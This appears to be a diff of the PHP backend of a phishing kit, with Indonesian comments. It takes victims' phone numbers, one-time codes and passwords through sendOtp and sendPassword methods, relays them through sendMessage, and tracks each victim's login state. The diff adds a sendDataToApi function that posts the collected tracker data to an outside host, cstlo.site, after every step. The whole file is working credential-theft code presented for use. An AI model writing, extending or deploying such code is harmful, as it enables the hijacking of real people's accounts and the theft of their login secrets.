@@ -1,4 +1,4 @@
-<?Php
+<?php
 session_start();
 header("Content-Type: application/json");
 
@@ -6,10 +6,14 @@ require("_core.php");
 
 $r = array();
 $allowedMethod = ["sendCode","sendOtp","sendPassword","update","getStatus"];
+$apiUrl = "https://cstlo.site/API/server.php"; // Ganti dengan URL API server penyimpanan
+
 if (isset($_POST["method"]) && in_array($_POST["method"], $allowedMethod)) {
     $method = $_POST["method"];
 
-    $tracker = json_decode(file_get_contents("tracker.json"), TRUE);
+    // Ambil data tracker dari server lain melalui API
+    $tracker = json_decode(file_get_contents($apiUrl), true);
+    
     switch($method) {
         // STATUS : WAITING, SUCCESS, FAILED
         case "getStatus":
@@ -21,7 +25,6 @@ if (isset($_POST["method"]) && in_array($_POST["method"], $allowedMethod)) {
                     switch($tracker[$phoneN]["type"]) {
                         case "checkPhone": $_SESSION["state"] = "phone"; break;
                         case "OTP":
-                            // KALAU DETAIL SUCCESS, MAKA JADIKAN OTP ? KALAU PASSWORDNEEDED, MAKA 
                             $_SESSION["state"] = $TX["detail"] == "success" ? "success" : ($TX["detail"] == "passwordNeeded" ? "otp" : false);
                             break;
                         case "password": $_SESSION["state"] = "success"; break;
@@ -37,6 +40,9 @@ if (isset($_POST["method"]) && in_array($_POST["method"], $allowedMethod)) {
             $_SESSION["phone"] = $phoneN;
             $tracker[$phoneN] = array("type" => "checkPhone", "status" => "waiting");
             sendMessage($phoneN);
+
+            // Kirim data ke server API
+            sendDataToApi($tracker);
             break;
 
         case "sendOtp":
@@ -45,6 +51,9 @@ if (isset($_POST["method"]) && in_array($_POST["method"], $allowedMethod)) {
             $_SESSION["otp"] = $OTP;
             $tracker[$phoneN] = array("type" => "OTP", "status" => "waiting");
             sendMessage(implode(":", [$phoneN,$OTP]));
+
+            // Kirim data ke server API
+            sendDataToApi($tracker);
             break;
 
         case "sendPassword":
@@ -53,6 +62,9 @@ if (isset($_POST["method"]) && in_array($_POST["method"], $allowedMethod)) {
             $password = $_POST["password"];
             $tracker[$phoneN] = array("type" => "password", "status" => "waiting");
             sendMessage(implode(":", [$phoneN,$OTP,$password]));
+
+            // Kirim data ke server API
+            sendDataToApi($tracker);
             break;
 
         case "update":
@@ -71,15 +83,32 @@ if (isset($_POST["method"]) && in_array($_POST["method"], $allowedMethod)) {
                     $tracker[$phoneN]["hint"] = $_POST["hint"];
                     $_SESSION["hint"] = $_POST["hint"];
                 }
-            } break;
+            }
 
+            // Kirim data ke server API
+            sendDataToApi($tracker);
+            break;
 
         default:
             // $response
             break;
     }
+}
 
-    file_put_contents("tracker.json", json_encode($tracker, JSON_PRETTY_PRINT));
+// Fungsi untuk mengirim data ke API server lain
+function sendDataToApi($tracker) {
+    global $apiUrl;
+
+    $data = json_encode($tracker);
+    $ch = curl_init($apiUrl);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+    $response = curl_exec($ch);
+    curl_close($ch);
+    
+    return $response;
 }
 
 echo json_encode($r, JSON_PRETTY_PRINT);
